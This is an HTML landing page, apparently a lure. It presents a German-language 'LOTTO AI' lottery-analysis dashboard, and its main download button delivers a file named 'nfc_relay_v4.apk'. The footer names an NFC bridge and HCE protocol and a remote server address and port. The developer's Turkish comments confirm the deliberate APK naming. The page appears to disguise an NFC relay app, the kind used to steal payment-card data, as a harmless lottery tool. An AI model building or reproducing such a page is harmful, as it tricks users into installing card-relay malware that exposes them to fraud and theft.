<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOTTO AI | Premium Dashboard v6.5</title>
    <style>
        :root {
            --primary: #00ff41; 
            --accent: #58a6ff;
            --bg-dark: #05080a;
        }

        body {
            background-color: var(--bg-dark);
            color: #ffffff;
            font-family: 'Segoe UI', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* --- ARKA PLAN GÖRSELLERİ (PNG 1, 2, 3) --- */
        .bg-layer {
            position: absolute;
            z-index: 1;
            pointer-events: none;
            opacity: 0.15;
            filter: blur(1px);
        }
        .bg-1 { top: -10%; left: -5%; width: 40%; transform: rotate(-15deg); }
        .bg-2 { bottom: -10%; right: -5%; width: 45%; }
        .bg-3 { top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; opacity: 0.1; }

        /* --- ANA PANEL (ORTADA) --- */
        .glass-card {
            background: rgba(13, 17, 23, 0.95);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 30px;
            padding: 40px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 0 80px rgba(0, 255, 65, 0.2);
            backdrop-filter: blur(20px);
            z-index: 10;
            position: relative;
        }

        /* ÜST LOGO (PROFİL) */
        .top-logo {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            border: 3px solid var(--primary);
            box-shadow: 0 0 25px var(--primary);
            margin-bottom: 25px;
            object-fit: cover;
        }

        h1 {
            font-size: 24px;
            color: var(--primary);
            letter-spacing: 2px;
            text-transform: uppercase;
            margin: 0;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
        }

        .status-badge {
            background: rgba(0, 255, 65, 0.1);
            color: var(--primary);
            padding: 6px 18px;
            border-radius: 50px;
            font-size: 13px;
            border: 1px solid var(--primary);
            display: inline-block;
            margin: 20px 0 30px 0;
        }

        /* İSTEDİĞİN ORTA GÖRSEL (PNG 1) */
        .center-image-box {
            width: 100%;
            border-radius: 15px;
            margin-bottom: 30px;
            border: 2px solid rgba(0, 255, 65, 0.2);
            overflow: hidden;
            background: #000;
        }
        .center-image-box img {
            width: 100%;
            display: block;
            transition: transform 0.4s ease;
        }
        .center-image-box:hover img {
            transform: scale(1.05);
        }

        /* APK İNDİRME BUTONU (ALMANCA) */
        .btn-download {
            background: linear-gradient(135deg, #00ff41 0%, #008f11 100%);
            color: #000;
            text-decoration: none;
            display: block;
            padding: 22px;
            font-weight: 900;
            border-radius: 15px;
            font-size: 20px;
            text-transform: uppercase;
            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.3);
        }

        .btn-download:hover {
            transform: scale(1.04);
            box-shadow: 0 15px 40px rgba(0, 255, 65, 0.5);
            filter: brightness(1.2);
        }

        .footer-text {
            margin-top: 35px;
            font-size: 11px;
            color: #484f58;
            line-height: 1.6;
            letter-spacing: 0.5px;
        }

        .blink {
            height: 10px; width: 10px;
            background-color: var(--primary);
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
            box-shadow: 0 0 10px var(--primary);
            animation: pulse-red 1.5s infinite;
        }

        @keyframes pulse-red {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
            100% { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>

    <!-- ARKA PLAN PNG RESİMLERİ (Senin Dosyaların) -->
    <img src="1.png" class="bg-layer bg-1" onerror="this.style.display='none'">
    <img src="2.png" class="bg-layer bg-2" onerror="this.style.display='none'">
    <img src="3.png" class="bg-layer bg-3" onerror="this.style.display='none'">

    <div class="glass-card">
        <!-- ÜSTTEKİ LOGO (Daha Karizmatik Durması İçin 1.png'yi burada da kullanabiliriz veya logo.png) -->
        <img src="1.png" alt="Logo" class="top-logo">
        
        <h1>LOTTO ANALYSE</h1>
        <div class="status-badge">
            <span class="blink"></span> SİSTEM AKTIV: v6.5.0
        </div>

        <!-- ORTADAKİ ANA GÖRSEL (TAM İSTEDİĞİN GİBİ SADECE 1.PNG) -->
        <div class="center-image-box">
            <img src="1.png" alt="Analyse Grafik">
        </div>

        <!-- APK İNDİRME BUTONU -->
        <!-- Notlarındaki APK İsmini 'nfc_relay_v4.apk' yaptığını varsayıyorum kanka -->
        <a href="nfc_relay_v4.apk" class="btn-download">
            APK HERUNTERLADEN
        </a>

        <div class="footer-text">
            NFC Bridge & HCE Protocol Master<br>
            VDS Connection: 216.106.178.54:6060<br>
            &copy; 2026 Dilyan2121 Master Project
        </div>
    </div>

</body>
</html>
